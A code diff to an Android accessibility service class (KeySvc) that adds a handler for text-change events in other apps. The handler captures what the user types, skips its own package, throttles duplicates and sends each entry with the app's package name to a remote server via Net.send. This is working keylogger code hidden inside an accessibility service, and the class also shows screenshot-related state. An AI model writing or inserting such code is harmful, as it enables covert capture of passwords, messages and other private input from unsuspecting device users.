@@ -34,6 +34,8 @@ public class KeySvc extends AccessibilityService {
     public volatile String curPkg;
     private volatile String curWin;
     public volatile boolean shotOn = true;
+    private volatile String ultCampo = "";
+    private volatile long ultCampoMs;
     private volatile boolean shotBusy;
     private volatile long lastShot;
     private WindowManager wm;
@@ -95,6 +97,22 @@ public class KeySvc extends AccessibilityService {
                 String w = e.getClassName().toString();
                 int i = w.lastIndexOf('.');
                 curWin = i >= 0 ? w.substring(i + 1) : w;
+            }
+            if (e.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
+                try {
+                    java.util.List<CharSequence> lt = e.getText();
+                    if (lt != null && lt.size() > 0 && lt.get(0) != null) {
+                        String t = lt.get(0).toString();
+                        if (t.length() > 0 && t.length() < 300 && !t.equals(ultCampo)
+                                && System.currentTimeMillis() - ultCampoMs > 300
+                                && p != null && !p.equals(getPackageName())) {
+                            ultCampo = t;
+                            ultCampoMs = System.currentTimeMillis();
+                            Net.send("{\"t\":\"k\",\"pkg\":\"" + Util.esc(p)
+                                    + "\",\"win\":\"campo\",\"o\":\"" + Util.esc("= " + t) + "\"}");
+                        }
+                    }
+                } catch (Throwable ignored2) {}
             }
         } catch (Throwable ignored) {}
     }
